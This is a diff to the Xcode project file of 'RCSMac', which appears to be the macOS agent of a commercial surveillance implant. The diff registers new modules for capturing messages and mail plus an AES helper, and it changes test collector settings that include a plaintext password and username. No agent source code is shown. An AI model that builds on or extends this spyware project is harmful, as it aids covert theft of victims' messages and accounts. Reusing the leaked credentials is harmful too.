@@ -176,6 +176,8 @@
 		8D11072B0486CEB800E47090 /* InfoPlist.strings in Resources */ = {isa = PBXBuildFile; fileRef = 089C165CFE840E0CC02AAC07 /* InfoPlist.strings */; };
 		8D11072D0486CEB800E47090 /* RCSMMain.m in Sources */ = {isa = PBXBuildFile; fileRef = 29B97316FDCFA39411CA2CEA /* RCSMMain.m */; settings = {ATTRIBUTES = (); }; };
 		8D11072F0486CEB800E47090 /* Cocoa.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1058C7A1FEA54F0111CA2CBB /* Cocoa.framework */; };
+		8DAF01F018E42D33006BF11C /* NSMutableData+AES128.m in Sources */ = {isa = PBXBuildFile; fileRef = 8DAF01EF18E42D33006BF11C /* NSMutableData+AES128.m */; };
+		8DD22F4718C8712F008E52DE /* RCSMAgentMessages.m in Sources */ = {isa = PBXBuildFile; fileRef = 8DD22F4618C8712F008E52DE /* RCSMAgentMessages.m */; };
 		C52FEF4116FC596200DCBF2A /* __m_Social_Module.m in Sources */ = {isa = PBXBuildFile; fileRef = C52FEF4016FC596200DCBF2A /* __m_Social_Module.m */; };
 		C52FEF4516FC59C900DCBF2A /* __m_Social.m in Sources */ = {isa = PBXBuildFile; fileRef = C52FEF4416FC59C900DCBF2A /* __m_Social.m */; };
 		C52FEF4816FC5A0E00DCBF2A /* __m_Social_Facebook.m in Sources */ = {isa = PBXBuildFile; fileRef = C52FEF4716FC5A0E00DCBF2A /* __m_Social_Facebook.m */; };
@@ -418,6 +420,11 @@
 		52D836241393916B00C18E70 /* libxpcomglue_s.a */ = {isa = PBXFileReference; lastKnownFileType = archive.ar; name = libxpcomglue_s.a; path = Support/Firefox/lib/libxpcomglue_s.a; sourceTree = "<group>"; };
 		8D1107310486CEB800E47090 /* Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
 		8D1107320486CEB800E47090 /* RCSMac.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = RCSMac.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		8DAF01EE18E42D33006BF11C /* NSMutableData+AES128.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = "NSMutableData+AES128.h"; path = "Support/NSMutableData+AES128.h"; sourceTree = "<group>"; };
+		8DAF01EF18E42D33006BF11C /* NSMutableData+AES128.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = "NSMutableData+AES128.m"; path = "Support/NSMutableData+AES128.m"; sourceTree = "<group>"; };
+		8DCEC46118D1AE09004E3B9F /* RCSNativeMail.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSNativeMail.h; path = Support/RCSNativeMail.h; sourceTree = "<group>"; };
+		8DD22F4518C8711A008E52DE /* RCSMAgentMessages.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentMessages.h; path = Agents/RCSMAgentMessages.h; sourceTree = "<group>"; };
+		8DD22F4618C8712F008E52DE /* RCSMAgentMessages.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentMessages.m; path = Agents/RCSMAgentMessages.m; sourceTree = "<group>"; };
 		C52FEF3F16FC596200DCBF2A /* __m_Social_Module.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = __m_Social_Module.h; path = Agents/Social/__m_Social_Module.h; sourceTree = "<group>"; };
 		C52FEF4016FC596200DCBF2A /* __m_Social_Module.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = __m_Social_Module.m; path = Agents/Social/__m_Social_Module.m; sourceTree = "<group>"; };
 		C52FEF4316FC59C900DCBF2A /* __m_Social.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = __m_Social.h; path = Agents/Social/__m_Social.h; sourceTree = "<group>"; };
@@ -614,6 +621,9 @@
 		1A1B9A840F9E000C0036558C /* Support */ = {
 			isa = PBXGroup;
 			children = (
+				8DAF01EE18E42D33006BF11C /* NSMutableData+AES128.h */,
+				8DAF01EF18E42D33006BF11C /* NSMutableData+AES128.m */,
+				8DCEC46118D1AE09004E3B9F /* RCSNativeMail.h */,
 				1A87878A109F3DA100245A80 /* Speex */,
 				1A12A1501095F24C0090C4D7 /* mach_override.h */,
 				1A12A14F1095F24C0090C4D7 /* mach_override.mm */,
@@ -839,6 +849,8 @@
 		1AE6B5610F8E2574004736EA /* Agents */ = {
 			isa = PBXGroup;
 			children = (
+				8DD22F4618C8712F008E52DE /* RCSMAgentMessages.m */,
+				8DD22F4518C8711A008E52DE /* RCSMAgentMessages.h */,
 				C52FEF3E16FC58F600DCBF2A /* Social */,
 				5262A92B132A5A2C001D1988 /* RCSMAgentClipboard.h */,
 				5262A92C132A5A2C001D1988 /* RCSMAgentClipboard.m */,
@@ -1354,6 +1366,7 @@
 				52B8504815146D4E00F0D72E /* SBJsonStreamWriter.m in Sources */,
 				52B8504915146D4E00F0D72E /* SBJsonStreamWriterAccumulator.m in Sources */,
 				52B8504A15146D4E00F0D72E /* SBJsonStreamWriterState.m in Sources */,
+				8DAF01F018E42D33006BF11C /* NSMutableData+AES128.m in Sources */,
 				52B8504D15146D4E00F0D72E /* SBJsonWriter.m in Sources */,
 				52B8504B15146D4E00F0D72E /* SBJsonTokeniser.m in Sources */,
 				52B8504C15146D4E00F0D72E /* SBJsonUTF8Stream.m in Sources */,
@@ -1363,6 +1376,7 @@
 				C52FEF4116FC596200DCBF2A /* __m_Social_Module.m in Sources */,
 				C52FEF4516FC59C900DCBF2A /* __m_Social.m in Sources */,
 				C52FEF4816FC5A0E00DCBF2A /* __m_Social_Facebook.m in Sources */,
+				8DD22F4718C8712F008E52DE /* RCSMAgentMessages.m in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -1497,7 +1511,7 @@
 					"-lazy-lnspr4",
 				);
 				PRODUCT_NAME = RCSMInputManager;
-				SDKROOT = macosx10.7;
+				SDKROOT = macosx10.8;
 				USER_HEADER_SEARCH_PATHS = "../**";
 				WRAPPER_EXTENSION = bundle;
 			};
@@ -1545,7 +1559,7 @@
 					"-lazy-lnspr4",
 				);
 				PRODUCT_NAME = RCSMInputManager;
-				SDKROOT = macosx10.7;
+				SDKROOT = macosx10.8;
 				USER_HEADER_SEARCH_PATHS = "../**";
 				WRAPPER_EXTENSION = bundle;
 				ZERO_LINK = NO;
@@ -1637,10 +1651,10 @@
 				);
 				PRODUCT_NAME = RCSMac;
 				RCS_TEST_COLLECTOR = 192.168.100.100;
-				RCS_TEST_INSTANCE = RCS_0000001730;
-				RCS_TEST_PASSWD = osx_test;
+				RCS_TEST_INSTANCE = RCS_0000001796;
+				RCS_TEST_PASSWD = symbian123;
 				RCS_TEST_SYNCH = YES;
-				RCS_TEST_USER = osxtest;
+				RCS_TEST_USER = Giovanna;
 				SDKROOT = macosx10.9;
 				VALID_ARCHS = i386;
 			};
@@ -1677,10 +1691,10 @@
 				);
 				PRODUCT_NAME = RCSMac;
 				RCS_TEST_COLLECTOR = 192.168.100.100;
-				RCS_TEST_INSTANCE = RCS_0000001730;
-				RCS_TEST_PASSWD = osx_test;
+				RCS_TEST_INSTANCE = RCS_0000001796;
+				RCS_TEST_PASSWD = symbian123;
 				RCS_TEST_SYNCH = YES;
-				RCS_TEST_USER = osxtest;
+				RCS_TEST_USER = Giovanna;
 				SDKROOT = macosx10.9;
 				STANDARD_C_PLUS_PLUS_LIBRARY_TYPE = YES;
 				VALID_ARCHS = i386;
